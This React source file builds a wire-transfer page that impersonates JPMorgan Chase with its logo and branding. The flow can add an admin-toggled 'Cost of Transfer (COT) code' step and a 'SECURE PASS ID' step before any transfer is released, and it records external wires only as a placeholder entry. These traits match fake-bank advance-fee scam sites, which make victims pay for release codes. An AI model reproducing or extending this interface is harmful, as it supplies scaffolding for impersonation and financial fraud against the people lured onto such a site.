import { useEffect, useState } from "react";
import { useAuth } from "@/contexts/AuthContext";
import { supabase } from "@/integrations/supabase/client";
import { useToast } from "@/hooks/use-toast";
import { hashPin } from "@/lib/crypto";
import { useNavigate } from "react-router-dom";
import { cn } from "@/lib/utils";
import type { Tables } from "@/integrations/supabase/types";
import {
  ChevronLeft, Send, ShieldCheck, Loader2, CheckCircle2,
  Building2, User, CreditCard, Hash, FileText, DollarSign,
  ArrowRight, Lock
} from "lucide-react";
import ChaseLogo from "@/components/ChaseLogo";
import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp";

type TransferStep = "details" | "review" | "pin" | "cot" | "secure_id" | "success";

const US_BANKS = [
  "JPMorgan Chase", "Bank of America", "Wells Fargo", "Citibank",
  "U.S. Bank", "PNC Bank", "Goldman Sachs", "TD Bank", "Capital One",
  "Truist Bank", "Ally Bank", "SunTrust Bank", "BB&T", "KeyBank",
  "Regions Bank", "Fifth Third Bank", "Citizens Bank", "Discover Bank",
  "HSBC", "Barclays", "Deutsche Bank", "Credit Suisse", "UBS",
  "BNP Paribas", "Santander", "Other / International Bank"
];

const Transfer = () => {
  const { user, profile } = useAuth();
  const { toast } = useToast();
  const navigate = useNavigate();

  // Accounts
  const [accounts, setAccounts] = useState<Tables<"accounts">[]>([]);
  const [senderAccountId, setSenderAccountId] = useState("");

  // Wire transfer fields
  const [beneficiaryName, setBeneficiaryName] = useState("");
  const [beneficiaryBank, setBeneficiaryBank] = useState("");
  const [customBank, setCustomBank] = useState("");
  const [routingNumber, setRoutingNumber] = useState("");
  const [beneficiaryAccount, setBeneficiaryAccount] = useState("");
  const [swiftCode, setSwiftCode] = useState("");
  const [amount, setAmount] = useState("");
  const [memo, setMemo] = useState("");

  // Flow state
  const [step, setStep] = useState<TransferStep>("details");
  const [loading, setLoading] = useState(false);

  // Security
  const [cotActive, setCotActive] = useState(false);
  const [secureIdActive, setSecureIdActive] = useState(false);
  const [cotCodeInput, setCotCodeInput] = useState("");
  const [secureIdInput, setSecureIdInput] = useState("");
  const [pin, setPin] = useState("");

  // Internal receiver (for internal Chase-to-Chase wires)
  const [receiverAccountId, setReceiverAccountId] = useState<string | null>(null);

  useEffect(() => {
    if (!user) return;
    supabase.from("accounts").select("*").eq("user_id", user.id).eq("status", "active")
      .then(({ data }) => {
        setAccounts(data ?? []);
        if (data && data.length > 0) setSenderAccountId(data[0].id);
      });
    supabase.from("profiles").select("is_cot_active, is_secure_id_active").eq("user_id", user.id).single()
      .then(({ data }) => {
        if (data) { setCotActive(data.is_cot_active); setSecureIdActive(data.is_secure_id_active); }
      });
  }, [user]);

  const selectedAccount = accounts.find(a => a.id === senderAccountId);
  const bankDisplay = beneficiaryBank === "Other / International Bank" ? customBank : beneficiaryBank;

  const handleReview = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!beneficiaryName || !beneficiaryAccount || (!routingNumber && !swiftCode) || !amount || !senderAccountId) {
      toast({ title: "Missing fields", description: "Please fill in all required fields.", variant: "destructive" });
      return;
    }
    if (parseFloat(amount) <= 0) {
      toast({ title: "Invalid amount", description: "Amount must be greater than 0.", variant: "destructive" });
      return;
    }

    setLoading(true);
    // Attempt to find if receiver is also a Chase account (internal wire)
    const { data: receiver } = await supabase.from("accounts").select("id").eq("account_number", beneficiaryAccount).maybeSingle();
    setReceiverAccountId(receiver?.id ?? null);
    setLoading(false);
    setStep("review");
  };

  const handlePinSubmit = async () => {
    if (pin.length !== 4) return;
    setLoading(true);
    try {
      const pinHash = await hashPin(pin);
      const { data, error } = await supabase.rpc("verify_user_pin", { p_pin_hash: pinHash });

      if (error) throw error;
      if (!data) {
        toast({ title: "Incorrect PIN", description: "The transaction PIN you entered is invalid.", variant: "destructive" });
        return;
      }

      // PIN is correct, move to next step
      if (cotActive) {
        setStep("cot");
      } else if (secureIdActive) {
        setStep("secure_id");
      } else {
        executeTransfer();
      }
    } catch (err: any) {
      toast({ title: "Verification Error", description: err.message, variant: "destructive" });
    } finally {
      setLoading(false);
    }
  };

  const executeTransfer = async () => {
    setLoading(true);
    try {
      if (receiverAccountId) {
        // Internal Chase wire
        const pinHash = await hashPin(pin);
        const { error } = await supabase.rpc("transfer_with_pin", {
          p_sender_account_id: senderAccountId,
          p_receiver_account_id: receiverAccountId,
          p_amount: parseFloat(amount),
          p_pin_hash: pinHash,
          p_narration: memo || `Wire to ${beneficiaryName}`,
          p_cot_code: cotActive ? cotCodeInput : null,
          p_secure_id_code: secureIdActive ? secureIdInput : null,
        });
        if (error) throw error;
      } else {
        // External wire — record as a withdrawal / outbound wire
        const pinHash = await hashPin(pin);
        const { error } = await supabase.rpc("transfer_with_pin", {
          p_sender_account_id: senderAccountId,
          p_receiver_account_id: senderAccountId, // placeholder — admin processes externally
          p_amount: parseFloat(amount),
          p_pin_hash: pinHash,
          p_narration: memo || `Wire to ${beneficiaryName} at ${bankDisplay}`,
          p_cot_code: cotActive ? cotCodeInput : null,
          p_secure_id_code: secureIdActive ? secureIdInput : null,
        });
        if (error) throw error;
      }
      setStep("success");
    } catch (err: any) {
      toast({ title: "Wire Transfer Failed", description: err.message, variant: "destructive" });
    } finally {
      setLoading(false);
    }
  };

  const validateCot = async () => {
    if (!cotCodeInput) return;
    setLoading(true);
    try {
      const { data, error } = await supabase.rpc("verify_cot_code", { p_cot_code: cotCodeInput });
      if (error) throw error;
      if (!data) {
        toast({ title: "Invalid Code", description: "The COT Code you entered is incorrect.", variant: "destructive" });
        return;
      }

      if (secureIdActive) setStep("secure_id");
      else executeTransfer();
    } catch (err: any) {
      toast({ title: "Validation Error", description: err.message, variant: "destructive" });
    } finally {
      setLoading(false);
    }
  };

  const validateSecureId = async () => {
    if (!secureIdInput) return;
    setLoading(true);
    try {
      const { data, error } = await supabase.rpc("verify_secure_id_code", { p_secure_id_code: secureIdInput });
      if (error) throw error;
      if (!data) {
        toast({ title: "Invalid Code", description: "The SECURE PASS ID CODE you entered is incorrect.", variant: "destructive" });
        return;
      }
      executeTransfer();
    } catch (err: any) {
      toast({ title: "Validation Error", description: err.message, variant: "destructive" });
    } finally {
      setLoading(false);
    }
  };

  const resetForm = () => {
    setBeneficiaryName(""); setBeneficiaryBank(""); setCustomBank("");
    setRoutingNumber(""); setBeneficiaryAccount(""); setSwiftCode("");
    setAmount(""); setMemo(""); setPin("");
    setCotCodeInput(""); setSecureIdInput("");
    setReceiverAccountId(null);
    setStep("details");
  };

  // ─── Progress indicator ───────────────────────────────────────────────────
  const displayStepIndex =
    step === "details" ? 0 :
      step === "review" ? 1 :
        step === "success" ? 3 : 2; // pin, cot, secure_id all map to 2 (Authorize)


  return (
    <div className="min-h-screen bg-[#f4f6f9] flex flex-col">
      {/* ── Header ── */}
      <div className="bg-[#0E76C7] px-4 pt-4 pb-6 text-white">
        <div className="flex items-center justify-between mb-5">
          <button onClick={() => navigate(-1)} className="p-2 -ml-2 hover:bg-white/10 rounded-full transition-colors">
            <ChevronLeft className="w-6 h-6" />
          </button>
          <ChaseLogo className="h-6" style={{ filter: "brightness(0) invert(1)", width: "100px" }} />
          <div className="w-10" />
        </div>
        <div className="text-center pb-2">
          <div className="inline-flex items-center gap-2 bg-white/15 rounded-full px-4 py-1.5 mb-3">
            <Send className="w-4 h-4" />
            <span className="text-sm font-semibold tracking-wide">WIRE TRANSFER</span>
          </div>
          <h1 className="text-2xl font-bold">Send Wire Transfer</h1>
          <p className="text-white/70 text-sm mt-1">Domestic &amp; International</p>
        </div>

        {/* Progress bar */}
        {step !== "success" && (
          <div className="flex items-center gap-1 mt-4 px-4">
            {["Transfer Details", "Review", "Authorize"].map((label, i) => (
              <div key={label} className="flex-1">
                <div className={cn(
                  "h-1.5 rounded-full transition-all duration-300",
                  i <= displayStepIndex ? "bg-white" : "bg-white/30"
                )} />
                <p className={cn("text-[10px] mt-1 text-center font-medium", i <= displayStepIndex ? "text-white" : "text-white/50")}>{label}</p>
              </div>
            ))}
          </div>
        )}
      </div>

      {/* ── Body ── */}
      <div className="flex-1 px-4 -mt-2 pb-24 space-y-4">

        {/* ──────── Step 1: Details ──────── */}
        {step === "details" && (
          <form onSubmit={handleReview} className="space-y-4 pt-4">
            {/* From account */}
            <SectionCard title="From Account" icon={<CreditCard className="w-4 h-4 text-[#0E76C7]" />}>
              <div className="flex flex-col gap-2">
                {accounts.map(a => (
                  <label key={a.id} className={cn(
                    "flex items-center justify-between p-3 rounded-xl border-2 cursor-pointer transition-all",
                    senderAccountId === a.id ? "border-[#0E76C7] bg-blue-50" : "border-gray-100 bg-white"
                  )}>
                    <div className="flex items-center gap-3">
                      <input type="radio" name="sender" value={a.id} checked={senderAccountId === a.id}
                        onChange={() => setSenderAccountId(a.id)} className="accent-[#0E76C7]" />
                      <div>
                        <p className="font-semibold text-sm capitalize">{a.account_type === "checking" ? "Total Checking" : "Chase Savings"}</p>
                        <p className="text-xs text-gray-400 font-mono">**{a.account_number.slice(-4)}</p>
                      </div>
                    </div>
                    <span className="font-bold text-sm text-gray-800">
                      ${Number(a.balance).toLocaleString("en-US", { minimumFractionDigits: 2 })}
                    </span>
                  </label>
                ))}
              </div>
            </SectionCard>

            {/* Beneficiary */}
            <SectionCard title="Beneficiary Information" icon={<User className="w-4 h-4 text-[#0E76C7]" />}>
              <Field label="Beneficiary Full Name *" icon={<User className="w-4 h-4 text-gray-400" />}>
                <input
                  type="text" value={beneficiaryName} onChange={e => setBeneficiaryName(e.target.value)}
                  placeholder="John Doe / ACME Corp" required
                  className="w-full pl-10 pr-4 py-3 rounded-xl border border-gray-200 text-sm focus:outline-none focus:ring-2 focus:ring-[#0E76C7]/30 focus:border-[#0E76C7] bg-white"
                />
              </Field>

              <Field label="Beneficiary Bank *" icon={<Building2 className="w-4 h-4 text-gray-400" />}>
                <select
                  value={beneficiaryBank} onChange={e => setBeneficiaryBank(e.target.value)} required
                  className="w-full pl-10 pr-4 py-3 rounded-xl border border-gray-200 text-sm focus:outline-none focus:ring-2 focus:ring-[#0E76C7]/30 focus:border-[#0E76C7] bg-white appearance-none"
                >
                  <option value="">Select bank…</option>
                  {US_BANKS.map(b => <option key={b} value={b}>{b}</option>)}
                </select>
              </Field>

              {beneficiaryBank === "Other / International Bank" && (
                <Field label="Bank Name *" icon={<Building2 className="w-4 h-4 text-gray-400" />}>
                  <input
                    type="text" value={customBank} onChange={e => setCustomBank(e.target.value)}
                    placeholder="Enter bank name" required
                    className="w-full pl-10 pr-4 py-3 rounded-xl border border-gray-200 text-sm focus:outline-none focus:ring-2 focus:ring-[#0E76C7]/30 focus:border-[#0E76C7] bg-white"
                  />
                </Field>
              )}

              <Field label="Beneficiary Account / IBAN *" icon={<Hash className="w-4 h-4 text-gray-400" />}>
                <input
                  type="text" value={beneficiaryAccount} onChange={e => setBeneficiaryAccount(e.target.value)}
                  placeholder="Account number or IBAN" required
                  className="w-full pl-10 pr-4 py-3 rounded-xl border border-gray-200 text-sm font-mono focus:outline-none focus:ring-2 focus:ring-[#0E76C7]/30 focus:border-[#0E76C7] bg-white"
                />
              </Field>

              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="block text-xs font-semibold text-gray-500 mb-1.5">Routing / ABA #</label>
                  <input
                    type="text" value={routingNumber} onChange={e => setRoutingNumber(e.target.value)}
                    placeholder="021000021" maxLength={9}
                    className="w-full px-3 py-3 rounded-xl border border-gray-200 text-sm font-mono focus:outline-none focus:ring-2 focus:ring-[#0E76C7]/30 focus:border-[#0E76C7] bg-white"
                  />
                </div>
                <div>
                  <label className="block text-xs font-semibold text-gray-500 mb-1.5">SWIFT / BIC Code</label>
                  <input
                    type="text" value={swiftCode} onChange={e => setSwiftCode(e.target.value.toUpperCase())}
                    placeholder="CHASUS33" maxLength={11}
                    className="w-full px-3 py-3 rounded-xl border border-gray-200 text-sm font-mono focus:outline-none focus:ring-2 focus:ring-[#0E76C7]/30 focus:border-[#0E76C7] bg-white uppercase"
                  />
                </div>
              </div>
            </SectionCard>

            {/* Wire details */}
            <SectionCard title="Wire Details" icon={<DollarSign className="w-4 h-4 text-[#0E76C7]" />}>
              <Field label="Amount (USD) *" icon={<span className="text-gray-400 font-semibold text-sm">$</span>}>
                <input
                  type="number" value={amount} onChange={e => setAmount(e.target.value)}
                  placeholder="0.00" min="0.01" step="0.01" required
                  className="w-full pl-8 pr-4 py-3 rounded-xl border border-gray-200 text-sm focus:outline-none focus:ring-2 focus:ring-[#0E76C7]/30 focus:border-[#0E76C7] bg-white"
                />
              </Field>
              <Field label="Memo / Reference" icon={<FileText className="w-4 h-4 text-gray-400" />}>
                <input
                  type="text" value={memo} onChange={e => setMemo(e.target.value)}
                  placeholder="Payment reference or notes"
                  className="w-full pl-10 pr-4 py-3 rounded-xl border border-gray-200 text-sm focus:outline-none focus:ring-2 focus:ring-[#0E76C7]/30 focus:border-[#0E76C7] bg-white"
                />
              </Field>
            </SectionCard>

            <button
              type="submit" disabled={loading}
              className="w-full h-14 bg-[#0E76C7] text-white font-bold rounded-2xl flex items-center justify-center gap-2 hover:bg-[#0f6ab5] active:scale-[0.98] transition-all disabled:opacity-60 shadow-lg shadow-[#0E76C7]/30"
            >
              {loading ? <Loader2 className="w-5 h-5 animate-spin" /> : <><span>Review Transfer</span><ArrowRight className="w-5 h-5" /></>}
            </button>
          </form>
        )}

        {/* ──────── Step 2: Review ──────── */}
        {step === "review" && (
          <div className="space-y-4 pt-4">
            <SectionCard title="Transfer Summary" icon={<Send className="w-4 h-4 text-[#0E76C7]" />}>
              <InfoRow label="From" value={`${selectedAccount?.account_type === "checking" ? "Total Checking" : "Chase Savings"} (**${selectedAccount?.account_number.slice(-4)})`} />
              <InfoRow label="To" value={beneficiaryName} />
              <InfoRow label="Bank" value={bankDisplay || beneficiaryBank} />
              <InfoRow label="Account / IBAN" mono value={beneficiaryAccount} />
              {routingNumber && <InfoRow label="Routing #" mono value={routingNumber} />}
              {swiftCode && <InfoRow label="SWIFT / BIC" mono value={swiftCode} />}
              {memo && <InfoRow label="Memo" value={memo} />}
              <div className="border-t border-dashed border-gray-200 my-3" />
              <div className="flex justify-between items-center">
                <span className="text-sm font-semibold text-gray-700">Wire Amount</span>
                <span className="text-2xl font-black text-[#0E76C7]">${parseFloat(amount || "0").toLocaleString("en-US", { minimumFractionDigits: 2 })}</span>
              </div>
              <div className="mt-2 p-3 bg-amber-50 rounded-xl border border-amber-200">
                <p className="text-xs text-amber-700 font-medium">⚠️ Wire transfers are typically processed within 1–3 business days. Fees may apply for international wires.</p>
              </div>
            </SectionCard>

            <div className="flex gap-3">
              <button onClick={() => setStep("details")} className="flex-1 h-13 py-4 rounded-2xl border-2 border-gray-200 font-semibold text-gray-600 hover:bg-gray-50 transition-colors">
                Edit
              </button>
              <button onClick={() => setStep("pin")} className="flex-2 flex-1 h-13 py-4 bg-[#0E76C7] text-white font-bold rounded-2xl flex items-center justify-center gap-2 hover:bg-[#0f6ab5] transition-colors shadow-lg shadow-[#0E76C7]/25">
                <Lock className="w-4 h-4" /> Authorize
              </button>
            </div>
          </div>
        )}

        {/* ──────── Step 3: PIN ──────── */}
        {step === "pin" && (
          <div className="space-y-4 pt-4">
            <SectionCard title="Enter Transaction PIN" icon={<ShieldCheck className="w-4 h-4 text-[#0E76C7]" />}>
              <p className="text-sm text-gray-500 text-center mb-4">Enter your 4-digit PIN to authorize this wire transfer of <span className="font-bold text-gray-800">${parseFloat(amount || "0").toLocaleString("en-US", { minimumFractionDigits: 2 })}</span></p>
              <div className="flex justify-center">
                <InputOTP maxLength={4} value={pin} onChange={setPin}>
                  <InputOTPGroup>
                    <InputOTPSlot index={0} />
                    <InputOTPSlot index={1} />
                    <InputOTPSlot index={2} />
                    <InputOTPSlot index={3} />
                  </InputOTPGroup>
                </InputOTP>
              </div>
            </SectionCard>
            <div className="flex gap-3">
              <button onClick={() => { setStep("review"); setPin(""); }} className="flex-1 py-4 rounded-2xl border-2 border-gray-200 font-semibold text-gray-600 hover:bg-gray-50">Back</button>
              <button
                onClick={handlePinSubmit}
                disabled={pin.length !== 4 || loading}
                className="flex-1 py-4 bg-[#0E76C7] text-white font-bold rounded-2xl hover:bg-[#0f6ab5] transition-colors disabled:opacity-50 shadow-lg shadow-[#0E76C7]/25 flex items-center justify-center gap-2"
              >
                {loading ? <Loader2 className="w-4 h-4 animate-spin" /> : "Confirm"}
              </button>
            </div>
          </div>
        )}

        {/* ──────── Step 3b: COT Code ──────── */}
        {step === "cot" && (
          <div className="space-y-4 pt-4 animate-in fade-in slide-in-from-right-4 duration-300">
            <SectionCard title="Secondary Authentication (COT)" icon={<ShieldCheck className="w-4 h-4 text-red-600" />}>
              <div className="p-3 bg-red-50 rounded-xl border border-red-100 mb-4">
                <p className="text-xs text-red-700 font-medium leading-relaxed">
                  Authentication level 1: A Cost of Transfer (COT) code is required to authorize this transaction.
                </p>
              </div>

              <div className="space-y-1.5">
                <label className="text-xs font-semibold text-gray-500 uppercase tracking-wide">COT Code</label>
                <input
                  type="text" value={cotCodeInput} onChange={e => setCotCodeInput(e.target.value)}
                  placeholder="Enter COT Code"
                  className="w-full px-4 py-3 rounded-xl border border-gray-200 text-sm focus:outline-none focus:ring-2 focus:ring-red-600/20 focus:border-red-600 bg-white font-mono tracking-widest"
                />
              </div>
            </SectionCard>

            <div className="flex gap-3">
              <button
                onClick={() => setStep("pin")}
                className="flex-1 py-4 rounded-2xl border-2 border-gray-200 font-semibold text-gray-600 hover:bg-gray-50"
              >
                Back
              </button>
              <button
                onClick={validateCot}
                disabled={loading || !cotCodeInput}
                className="flex-2 flex-1 py-4 bg-[#0E76C7] text-white font-bold rounded-2xl hover:bg-[#0f6ab5] disabled:opacity-50 flex items-center justify-center gap-2 shadow-lg shadow-[#0E76C7]/25"
              >
                {loading ? <Loader2 className="w-4 h-4 animate-spin" /> : <>Continue <ArrowRight className="w-4 h-4" /></>}
              </button>
            </div>
          </div>
        )}

        {/* ──────── Step 3c: Secure ID ──────── */}
        {step === "secure_id" && (
          <div className="space-y-4 pt-4 animate-in fade-in slide-in-from-right-4 duration-300">
            <SectionCard title="Final Authentication (SECURE PASS)" icon={<Lock className="w-4 h-4 text-[#0E76C7]" />}>
              <div className="p-3 bg-blue-50 rounded-xl border border-blue-100 mb-4">
                <p className="text-xs text-[#0E76C7] font-medium leading-relaxed">
                  Authentication level 2: Please provide your SECURE PASS ID CODE to complete the wire transfer.
                </p>
              </div>

              <div className="space-y-1.5">
                <label className="text-xs font-semibold text-gray-500 uppercase tracking-wide">SECURE ID CODE</label>
                <input
                  type="text" value={secureIdInput} onChange={e => setSecureIdInput(e.target.value)}
                  placeholder="Enter Secure ID"
                  className="w-full px-4 py-3 rounded-xl border border-gray-200 text-sm focus:outline-none focus:ring-2 focus:ring-[#0E76C7]/20 focus:border-[#0E76C7] bg-white font-mono tracking-widest"
                />
              </div>
            </SectionCard>

            <div className="flex gap-3">
              <button
                onClick={() => cotActive ? setStep("cot") : setStep("pin")}
                className="flex-1 py-4 rounded-2xl border-2 border-gray-200 font-semibold text-gray-600 hover:bg-gray-50"
              >
                Back
              </button>
              <button
                onClick={validateSecureId}
                disabled={loading || !secureIdInput}
                className="flex-2 flex-1 py-4 bg-[#0E76C7] text-white font-bold rounded-2xl hover:bg-[#0f6ab5] disabled:opacity-50 flex items-center justify-center gap-2 shadow-lg shadow-[#0E76C7]/25"
              >
                {loading ? <><Loader2 className="w-4 h-4 animate-spin" /> Verifying...</> : "Authorize Release"}
              </button>
            </div>
          </div>
        )}

        {/* ──────── Step 4: Success ──────── */}
        {step === "success" && (
          <div className="flex flex-col items-center text-center pt-8 px-4 space-y-5">
            <div className="w-24 h-24 rounded-full bg-green-100 flex items-center justify-center animate-[scale-in_0.3s_ease-out]">
              <CheckCircle2 className="w-14 h-14 text-green-500" />
            </div>
            <div>
              <h2 className="text-2xl font-black text-gray-900">Wire Submitted!</h2>
              <p className="text-gray-500 mt-2 text-sm leading-relaxed">
                Your wire transfer of <span className="font-bold text-gray-800">${parseFloat(amount || "0").toLocaleString("en-US", { minimumFractionDigits: 2 })}</span> to <span className="font-bold text-gray-800">{beneficiaryName}</span> has been submitted and is being processed.
              </p>
            </div>

            <div className="w-full bg-white rounded-2xl border border-gray-100 shadow-sm p-4 space-y-2 text-left">
              <InfoRow label="Beneficiary" value={beneficiaryName} />
              <InfoRow label="Bank" value={bankDisplay || beneficiaryBank} />
              <InfoRow label="Amount" value={`$${parseFloat(amount || "0").toLocaleString("en-US", { minimumFractionDigits: 2 })}`} />
              <InfoRow label="Status" value="Processing" />
            </div>

            <div className="flex flex-col gap-3 w-full pt-2">
              <button
                onClick={resetForm}
                className="w-full h-14 bg-[#0E76C7] text-white font-bold rounded-2xl hover:bg-[#0f6ab5] transition-colors shadow-lg shadow-[#0E76C7]/25"
              >
                Send Another Wire
              </button>
              <button
                onClick={() => navigate("/dashboard")}
                className="w-full h-14 border-2 border-gray-200 font-bold rounded-2xl text-gray-700 hover:bg-gray-50 transition-colors"
              >
                Back to Dashboard
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

// ── Helper components ─────────────────────────────────────────────────────────

const SectionCard = ({ title, icon, children }: { title: string; icon: React.ReactNode; children: React.ReactNode }) => (
  <div className="bg-white rounded-2xl shadow-sm border border-gray-100 overflow-hidden">
    <div className="flex items-center gap-2 px-5 py-4 border-b border-gray-50">
      {icon}
      <h3 className="font-bold text-sm text-gray-800 uppercase tracking-wide">{title}</h3>
    </div>
    <div className="px-5 py-4 space-y-4">{children}</div>
  </div>
);

const Field = ({ label, icon, children }: { label: string; icon: React.ReactNode; children: React.ReactNode }) => (
  <div className="space-y-1.5">
    <label className="text-xs font-semibold text-gray-500 uppercase tracking-wide">{label}</label>
    <div className="relative">
      <div className="absolute left-3 top-1/2 -translate-y-1/2 pointer-events-none z-10">{icon}</div>
      {children}
    </div>
  </div>
);

const InfoRow = ({ label, value, mono = false }: { label: string; value: string; mono?: boolean }) => (
  <div className="flex items-start justify-between gap-4 py-1.5">
    <span className="text-xs text-gray-500 font-medium flex-shrink-0">{label}</span>
    <span className={cn("text-sm font-semibold text-gray-900 text-right", mono && "font-mono")}>{value}</span>
  </div>
);

export default Transfer;
